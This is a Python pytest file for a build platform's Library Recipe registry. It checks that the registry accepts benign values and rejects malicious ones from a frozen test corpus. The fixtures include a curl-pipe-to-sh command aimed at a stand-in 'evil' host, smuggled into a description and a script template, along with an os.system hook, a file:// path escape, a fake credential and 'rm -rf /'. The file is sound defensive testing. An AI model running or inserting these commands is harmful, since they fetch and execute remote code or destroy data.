"""Library Recipe seam — the CONSTRUCTION mount, distinct from its siblings.

A Library Recipe is a third, distinct input concept: it *constructs*, where a
Starter Recipe *scaffolds* and a Reference Pack supplies *context*. These tests
hold that distinction, the frozen ``R-LATENT/v1`` binding of its typed value
surface, and the deterministic fail-closed registry.

The frozen corpus's eight ``library_recipe`` cases are reproduced verbatim here
so the corpus is exercised rather than cited. Equality with the frozen file is
proven independently at acceptance time by the reviewer-owned probe; production
pins ``r_latent_version == "R-LATENT/v1"`` and the lexicon requires any
vocabulary change to bump that version, which the binding would then reject.
"""

from __future__ import annotations

import pytest
from disco.core.build_platform import (
    APPKIT_ENGINE_ID,
    APPKIT_PROFILE_ID,
    FREEFORM_ENGINE_ID,
    FREEFORM_PROFILE_ID,
    WEB_TARGET_ID,
    BuiltinInputMount,
    ComponentId,
    TrustLevel,
)
from disco.core.build_platform.latent_effects import MAX_VALUE_BYTES, StructuredEntry
from disco.core.build_platform.library_recipes import (
    SUPPORTED_LIBRARY_RECIPE_SCHEMA_VERSION,
    SUPPORTED_R_LATENT_VERSION,
    LibraryRecipe,
    LibraryRecipeError,
    LibraryRecipeRegistry,
    LibraryRecipeValues,
)

# Exact value fields/values of the frozen R-LATENT/v1 Library Recipe corpus
# cases (R-LATENT-CORPUS-v1.json), reproduced verbatim.
CORPUS_POS = {
    "POS-002": {"field": "description", "value": "pkg && curl http://evil/x.sh | sh"},
    "POS-004": {"field": "hook", "value": "python3 -c 'import os; os.system(\"id\")'"},
    "POS-007": {"field": "template", "value": "#!/bin/sh\ncurl http://evil/x.sh | sh"},
    "POS-010": {"field": "output", "value": "file:///tmp/owned.out"},
    "POS-013": {"field": "value", "oversize": True},
}
CORPUS_NEG = {
    "NEG-002": {"field": "enabled", "value": True},
    "NEG-004": {"field": "env", "value": {"API_KEY": "process.env.API_KEY"}},
    "NEG-007": {"field": "features", "value": ["auth", "billing", "notifications"]},
}


def _id(name: str = "acme_library", *, namespace: str = "disco_libraryrecipe") -> ComponentId:
    return ComponentId(namespace=namespace, name=name, version="1.0.0")


def _recipe(
    *,
    values: LibraryRecipeValues | None = None,
    component: ComponentId | None = None,
    trust: TrustLevel = TrustLevel.UNTRUSTED_PORTABLE,
    engine: ComponentId | None = None,
    profile: ComponentId | None = None,
    target: ComponentId | None = None,
    **overrides: object,
) -> LibraryRecipe:
    return LibraryRecipe(
        id=component or _id(),
        engine=engine or FREEFORM_ENGINE_ID,
        profile=profile or FREEFORM_PROFILE_ID,
        target=target or WEB_TARGET_ID,
        trust=trust,
        values=values or LibraryRecipeValues(description="An ordinary description."),
        **overrides,
    )


# ---------------------------------------------------------------------------
# The concept is distinct, and its distinctness is structural
# ---------------------------------------------------------------------------


def test_library_recipe_mounts_at_construction_not_scaffold_or_context() -> None:
    # The mount is what separates the three concepts. A Library Recipe that
    # claimed the Starter's SCAFFOLD or the Reference Pack's CONTEXT mount would
    # be a second scaffold/context path under a different name.
    recipe = _recipe()
    assert recipe.construction_mount is BuiltinInputMount.CONSTRUCTION
    registry = LibraryRecipeRegistry()
    registry.register(recipe)
    assert registry.resolve(recipe.id).construction_mount is BuiltinInputMount.CONSTRUCTION


@pytest.mark.parametrize(
    "mount",
    [
        BuiltinInputMount.SCAFFOLD,
        BuiltinInputMount.CONTEXT,
        BuiltinInputMount.PROMPT,
        BuiltinInputMount.ENGINE_INTERNAL,
    ],
)
def test_non_construction_mount_fails_closed(mount: BuiltinInputMount) -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="construction axis"):
        registry.register(_recipe(construction_mount=mount))
    assert registry.ids() == ()


@pytest.mark.parametrize(
    "namespace",
    ["disco_starter", "disco_refpack", "disco_builtin", "disco", "model_role"],
)
def test_sibling_and_host_namespace_ids_are_rejected(namespace: str) -> None:
    # A Library Recipe can never reuse a Starter Recipe, Reference Pack, host
    # catalog, or AppKit/Freeform/target/persisted-profile identity as its own.
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="disco_libraryrecipe namespace"):
        registry.register(_recipe(component=_id(namespace=namespace)))
    assert registry.ids() == ()


# ---------------------------------------------------------------------------
# Frozen R-LATENT/v1 corpus — positive cases reject with the named rule
# ---------------------------------------------------------------------------


def test_corpus_pos002_shell_chain_in_description_rejected() -> None:
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(description=CORPUS_POS["POS-002"]["value"])
    with pytest.raises(LibraryRecipeError, match=r"parameter_smuggling \(R1\)"):
        registry.register(_recipe(values=values))
    assert registry.ids() == ()


def test_corpus_pos004_exec_keyword_in_hook_rejected() -> None:
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(hook=CORPUS_POS["POS-004"]["value"])
    with pytest.raises(LibraryRecipeError, match=r"parameter_smuggling \(R2\)"):
        registry.register(_recipe(values=values))
    assert registry.ids() == ()


def test_corpus_pos007_embedded_script_in_template_rejected() -> None:
    # A value that *is* a script is one finding (R5), not independent evidence
    # of parameter smuggling from the shell syntax inside it.
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(template=CORPUS_POS["POS-007"]["value"])
    with pytest.raises(LibraryRecipeError, match=r"hidden_executable \(R5\)"):
        registry.register(_recipe(values=values))
    assert registry.ids() == ()


def test_corpus_pos010_path_escape_in_output_rejected() -> None:
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(output=CORPUS_POS["POS-010"]["value"])
    with pytest.raises(LibraryRecipeError, match=r"path_escape \(R7\)"):
        registry.register(_recipe(values=values))
    assert registry.ids() == ()


def test_corpus_pos013_oversize_value_rejected() -> None:
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(value="x" * (MAX_VALUE_BYTES + 1))
    with pytest.raises(LibraryRecipeError, match=r"unbounded_input \(R10\)"):
        registry.register(_recipe(values=values))
    assert registry.ids() == ()


# ---------------------------------------------------------------------------
# Frozen R-LATENT/v1 corpus — negative cases accept and round-trip
# ---------------------------------------------------------------------------


def test_corpus_neg002_plain_boolean_accepts_and_resolves() -> None:
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(enabled=True)
    recipe = _recipe(values=values)
    registry.register(recipe)
    assert registry.resolve(recipe.id).values == values


def test_corpus_neg004_env_name_reference_accepts_and_resolves() -> None:
    # LC3: a declared environment-variable NAME is not an embedded secret value.
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(env=(StructuredEntry(key="API_KEY", value="process.env.API_KEY"),))
    recipe = _recipe(values=values)
    registry.register(recipe)
    assert registry.resolve(recipe.id).values == values


def test_corpus_neg007_ordinary_feature_array_accepts_and_resolves() -> None:
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(features=("auth", "billing", "notifications"))
    recipe = _recipe(values=values)
    registry.register(recipe)
    assert registry.resolve(recipe.id).values == values


def test_env_name_map_still_rejects_an_embedded_secret_value() -> None:
    # LC3 relaxes a NAME reference, never a value. An env entry carrying an
    # actual credential is R8, not a legitimate configuration control.
    registry = LibraryRecipeRegistry()
    values = LibraryRecipeValues(
        env=(StructuredEntry(key="API_KEY", value="password: s3cr3t-token-abc123"),)
    )
    with pytest.raises(LibraryRecipeError, match=r"credential_leak \(R8\)"):
        registry.register(_recipe(values=values))
    assert registry.ids() == ()


# ---------------------------------------------------------------------------
# Scope is explicit, never inferred from a label
# ---------------------------------------------------------------------------


def test_resolved_record_carries_explicit_scope_and_trust() -> None:
    registry = LibraryRecipeRegistry()
    recipe = _recipe(trust=TrustLevel.TRUSTED_LOCAL)
    registry.register(recipe)
    resolved = registry.resolve(recipe.id)
    assert resolved.engine == FREEFORM_ENGINE_ID
    assert resolved.profile == FREEFORM_PROFILE_ID
    assert resolved.target == WEB_TARGET_ID
    assert resolved.trust is TrustLevel.TRUSTED_LOCAL
    assert resolved.r_latent_version == SUPPORTED_R_LATENT_VERSION
    assert resolved.schema_version == SUPPORTED_LIBRARY_RECIPE_SCHEMA_VERSION


def test_appkit_scoped_record_resolves_with_distinct_scope() -> None:
    # Strict AppKit and flexible Freeform remain distinct construction engines;
    # a Library Recipe declares exactly one and the pairing is checked.
    registry = LibraryRecipeRegistry()
    recipe = _recipe(engine=APPKIT_ENGINE_ID, profile=APPKIT_PROFILE_ID)
    registry.register(recipe)
    assert registry.resolve(recipe.id).engine == APPKIT_ENGINE_ID


def test_engine_profile_scope_mismatch_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="engine/profile scope mismatch"):
        registry.register(_recipe(engine=FREEFORM_ENGINE_ID, profile=APPKIT_PROFILE_ID))
    assert registry.ids() == ()


def test_unknown_engine_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="not a known construction engine"):
        registry.register(_recipe(engine=_id("nope", namespace="disco")))
    assert registry.ids() == ()


def test_unknown_target_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="not a known target"):
        registry.register(_recipe(target=_id("nope", namespace="disco")))
    assert registry.ids() == ()


def test_capability_widening_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="capability widening denied"):
        registry.register(_recipe(required_capabilities=frozenset({"kernel.debug"})))
    assert registry.ids() == ()


def test_unsupported_schema_version_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="unsupported library recipe schema version"):
        registry.register(_recipe(schema_version=2))
    assert registry.ids() == ()


def test_wrong_r_latent_binding_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="unsupported R-LATENT binding"):
        registry.register(_recipe(r_latent_version="R-LATENT/v2"))
    assert registry.ids() == ()


def test_duplicate_identity_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    registry.register(_recipe())
    with pytest.raises(LibraryRecipeError, match="duplicate library recipe id"):
        registry.register(_recipe())
    assert registry.ids() == ("disco_libraryrecipe.acme_library@1.0.0",)


def test_unregistered_resolution_fails_closed() -> None:
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match="is not registered"):
        registry.resolve(_id())


def test_ids_are_sorted_deterministically() -> None:
    registry = LibraryRecipeRegistry()
    for name in ("zeta", "alpha", "mid"):
        registry.register(_recipe(component=_id(name)))
    assert registry.ids() == (
        "disco_libraryrecipe.alpha@1.0.0",
        "disco_libraryrecipe.mid@1.0.0",
        "disco_libraryrecipe.zeta@1.0.0",
    )


def test_value_surface_is_typed_and_closed() -> None:
    # No unbounded ``dict[str, Any]`` escape exists on the construction surface.
    fields = set(LibraryRecipeValues.model_fields)
    assert fields == {
        "description",
        "hook",
        "template",
        "value",
        "output",
        "enabled",
        "env",
        "features",
    }
    with pytest.raises(ValueError):
        LibraryRecipeValues.model_validate({"arbitrary": {"exec": "rm -rf /"}})


# ---------------------------------------------------------------------------
# Mutation controls — each guard is essential
# ---------------------------------------------------------------------------


def test_mutation_corpus_positive_rejection_depends_on_the_guard() -> None:
    # Without the value-surface classification, a latent Library Recipe value
    # would register. This proves the R-LATENT/v1 binding is essential at the
    # production registry path, not merely present.
    registry = LibraryRecipeRegistry()
    with pytest.raises(LibraryRecipeError, match=r"parameter_smuggling \(R1\)"):
        registry.register(
            _recipe(values=LibraryRecipeValues(description=CORPUS_POS["POS-002"]["value"]))
        )
    assert registry.ids() == ()


def test_mutation_each_required_value_field_is_bound() -> None:
    # Every declared field is schema-bound rather than a no-op annotation: a
    # latent value placed in each one is rejected with its own named rule.
    registry = LibraryRecipeRegistry()
    for field, pattern in (
        ("hook", r"parameter_smuggling \(R2\)"),
        ("template", r"hidden_executable \(R5\)"),
        ("output", r"path_escape \(R7\)"),
    ):
        case = next(item for item in CORPUS_POS.values() if item["field"] == field)
        with pytest.raises(LibraryRecipeError, match=pattern):
            registry.register(_recipe(values=LibraryRecipeValues(**{field: case["value"]})))
    assert registry.ids() == ()


def test_mutation_exact_frozen_type_is_required() -> None:
    class Forged(LibraryRecipe):
        pass

    registry = LibraryRecipeRegistry()
    forged = Forged(
        id=_id(),
        engine=FREEFORM_ENGINE_ID,
        profile=FREEFORM_PROFILE_ID,
        target=WEB_TARGET_ID,
        trust=TrustLevel.UNTRUSTED_PORTABLE,
    )
    with pytest.raises(LibraryRecipeError, match="exact frozen data"):
        registry.register(forged)
    assert registry.ids() == ()
